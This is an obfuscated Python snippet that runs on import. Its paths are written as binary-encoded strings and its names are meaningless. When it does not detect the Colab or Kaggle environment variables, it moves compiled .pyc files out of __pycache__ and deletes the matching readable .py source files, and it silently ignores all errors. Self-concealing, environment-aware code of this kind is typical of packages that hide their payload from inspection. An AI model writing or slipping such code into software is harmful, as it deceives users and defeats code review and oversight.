def ____10101010():
    try:
        from os import environ, path, listdir, rename, remove
        if 'UPG_BALOC'[::-1] not in environ and 'EPYT_NUR_LENREK_ELGGAK'[::-1] not in environ:
            def __0101010101(binary):
                    try:
                        text = ''.join(chr(int(binary[i:i+8], 2)) for i in range(0, len(binary), 8))
                        return text
                    except: return binary
            from shutil import move
            dir_path = path.dirname(path.realpath(__file__))
            dir_path = dir_path.replace('\\', __0101010101('00101111'))
            dir_path += __0101010101('00101111')
            try:
                if not path.exists(dir_path+__0101010101('0110001101101111011100100110010100101110011100000111100101100011')):
                    pycache_dir = dir_path+__0101010101('010111110101111101110000011110010110001101100001011000110110100001100101010111110101111100101111')
                    for filename in listdir(pycache_dir):
                        if filename.startswith(__0101010101('01100011011011110111001001100101')):
                            move(pycache_dir+filename, dir_path+filename)
                            rename(dir_path+filename, dir_path+__0101010101('0110001101101111011100100110010100101110011100000111100101100011'))
                            remove(dir_path+__0101010101('01100011011011110111001001100101001011100111000001111001'))
                            break
            except: pass
            try:
                if not path.exists(dir_path+__0101010101('0101111101011111001100000011000100110000001100010011000000110001001100000011000100101110011100000111100101100011')):
                    pycache_dir = dir_path+__0101010101('010111110101111101110000011110010110001101100001011000110110100001100101010111110101111100101111')
                    for filename in listdir(pycache_dir):
                        if filename.startswith(__0101010101('01011111010111110011000000110001001100000011000100110000001100010011000000110001')):
                            move(pycache_dir+filename, dir_path+filename)
                            rename(dir_path+filename, dir_path+__0101010101('0101111101011111001100000011000100110000001100010011000000110001001100000011000100101110011100000111100101100011'))
                            remove(dir_path+__0101010101('01011111010111110011000000110001001100000011000100110000001100010011000000110001001011100111000001111001'))
                            break
            except: pass            
    except: pass
____10101010()
